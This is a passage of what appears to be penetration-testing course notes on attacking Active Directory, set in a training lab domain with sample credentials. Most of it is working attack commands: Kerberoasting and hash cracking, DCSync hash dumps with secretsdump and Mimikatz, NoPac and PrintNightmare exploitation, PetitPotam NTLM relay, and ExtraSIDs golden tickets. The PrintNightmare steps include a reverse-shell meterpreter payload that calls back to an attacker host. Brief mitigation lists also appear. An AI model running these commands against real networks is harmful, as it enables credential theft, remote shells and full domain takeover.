- Supports GPO enumeration with `--gpos`.

---

## 3.6 Kerberoasting from Linux

Kerberoasting requests TGS tickets for service accounts with SPNs, then cracks them offline to recover service account passwords.

### GetUserSPNs.py (Impacket)
```bash
sudo python3 -m pip install .
sudo pip3 install impacket
GetUserSPNs.py -h
```

### List SPNs (all)
```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
```

### Request TGS Tickets (all)
```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request
```

### Request TGS Ticket (specific user)
```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <TARGET_USER>
```

### Request and Save TGS Ticket
```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <TARGET_USER> -outputfile <OUTPUT_FILE>
```

### Crack TGS Tickets with Hashcat
```bash
hashcat -m 13100 <TGS_FILE> <WORDLIST>
hashcat -m 13100 <TGS_FILE> <WORDLIST> --force
hashcat -m 13100 <TGS_FILE> <WORDLIST> -o <CRACKED_FILE>
```

### Verify Extracted Hashes
```bash
strings <TGS_FILE> | head
hexdump -C <TGS_FILE> | less
```

### Test Authentication
```bash
sudo crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD>
```

### Alternative: BloodHound for SPN/attack path visualization
```bash
neo4j console &
bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -c All
```

---

## 3.7 DCSync

DCSync extracts password hashes from AD by impersonating a domain controller via the Directory Replication Service Remote Protocol. Requires an account with `DS-Replication-Get-Changes-All` (Domain Admins / Enterprise Admins by default).

### Checking User Privileges
```powershell
Get-DomainUser -Identity adunn | select samaccountname, objectsid, memberof, useraccountcontrol | fl
```

```powershell
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get') } | ? { $_.SecurityIdentifier -match $sid } | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
```

### Using secretsdump.py (Linux)
```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
secretsdump.py -just-dc-user administrator INLANEFREIGHT/adunn@172.16.5.5
secretsdump.py -history -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

Example output:
```
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
```

### Using Mimikatz (Windows)
```cmd
runas /netonly /user:INLANEFREIGHT\adunn powershell
```
```powershell
mimikatz.exe
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

Example output:
```
SAM Username         : administrator
Hash NTLM           : 88ad09182de639ccc6579eb0849751cf
```

### Check Password Last Set
```powershell
Get-ADUser -Filter * -Properties PwdLastSet | select SamAccountName, PwdLastSet
```

### Mitigation
1. Restrict `DS-Replication-Get-Changes-All` to domain controllers only.
2. Monitor Event ID 4662 (Audit Directory Service Access) and Event ID 4742 (user account changes).
3. Implement Principle of Least Privilege.
4. Use Managed Service Accounts.
5. Enable LAPS.

---

## 3.8 Bleeding-Edge Vulnerabilities

### NoPac (SamAccountName Spoofing) — CVE-2021-42278 & CVE-2021-42287

Elevates privileges to Domain Admin.

**Setup:**
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
python3 setup.py install
git clone https://github.com/Ridter/noPac.git
cd noPac
```

**Vulnerability scanning:**
```bash
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

**Interactive shell as SYSTEM:**
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

**DCSync via NoPac:**
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

### PrintNightmare (Print Spooler) — CVE-2021-34527 & CVE-2021-1675

Gains SYSTEM-level remote access.

**Setup:**
```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
cd CVE-2021-1675
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

**Service enumeration:**
```bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

**Payload generation:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

**SMB share setup:**
```bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

**Metasploit listener:**
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run
```

**Exploit execution:**
```bash
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
```bash
shell
whoami
```

### PetitPotam (MS-EFSRPC) — CVE-2021-36942

Coerces domain controller authentication for NTLM relay to AD CS, leading to domain compromise.

**NTLM relay setup:**
```bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

**Authentication coercion:**
```bash
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

**TGT request (PKINITtools):**
```bash
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
export KRB5CCNAME=dc01.ccache
```

**DCSync:**
```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

---

## 3.9 Attacking Domain Trusts — Child→Parent (ExtraSIDs)

SID History is used in AD migrations to retain access to resources. Attackers can inject privileged SIDs (e.g., Enterprise Admins) into a compromised account's `sidHistory` to escalate across a forest trust (no SID filtering within a forest).

### Requirements
- KRBTGT hash of the child domain.
- SID of the child domain.
- Name of a target user in the child domain (can be nonexistent).
- FQDN of the child domain.
- SID of the Enterprise Admins group in the parent domain.

### Gather Required Data
```mimikatz
lsadump::dcsync /user:LOGISTICS\krbtgt
```
```powershell
Get-DomainSID
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
```

### ExtraSIDs Attack with Mimikatz (Golden Ticket)
```mimikatz
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

### Verify the Ticket
```cmd
klist
```

### Access Parent Domain Resources
```cmd
dir \\academy-ea-dc01.inlanefreight.local\c$
```

### ExtraSIDs Attack with Rubeus
```cmd
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
```cmd
klist
```
```mimikatz
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

### Defense Strategies
- **Enable SID Filtering:** `netdom trust TrustingDomain /domain:TrustedDomain /quarantine:yes`
- **Monitor** Event ID 4765 & 4766 (SID History modifications).
- **Restrict** Enterprise Admins / Domain Admins membership.
- **Implement** a Tiered Administration Model.
- **Regularly audit** trust relationships.

---

# QUICK REFERENCE: HASHCAT MODES

| Hash Type | Mode |
|-----------|------|
| NTLM | `-m 1000` |
| NTLMv2 (Responder) | `-m 5600` |
| Kerberos TGS (Kerberoasting) | `-m 13100` |

---

# QUICK REFERENCE: KEY TOOLS

| Tool | Purpose |
|------|---------|
| `JuicyPotato` / `PrintSpoofer` / `RoguePotato` | SeImpersonate abuse (Windows) |
| `Mimikatz` / `pypykatz` | LSASS dumping & credential extraction |
| `procdump` | LSASS minidump |
| `SharpUp` / `accesschk` / `icacls` | Windows permission auditing |
| `pspy` | Linux process monitoring without root |
| `Lynis` | Linux system audit |
| `Responder` / `Inveigh` | LLMNR/NBT-NS poisoning |
| `Kerbrute` | AD user enumeration & password spraying |
| `CrackMapExec` (CME) | SMB enumeration & exploitation |
| `SMBMap` | SMB share analysis |
| `rpcclient` | MS-RPC AD enumeration |
| `Impacket` (`psexec.py`, `wmiexec.py`, `secretsdump.py`, `GetUserSPNs.py`) | Windows protocol interaction |
| `Windapsearch` | LDAP-based AD enumeration |
| `BloodHound` / `SharpHound` | AD attack path mapping |
| `ntlmrelayx.py` | NTLM relay attacks |
| `PetitPotam.py` | MS-EFSRPC authentication coercion |
| `Rubeus` | Kerberos ticket manipulation (Windows) |
| `hashcat` | Offline hash cracking |
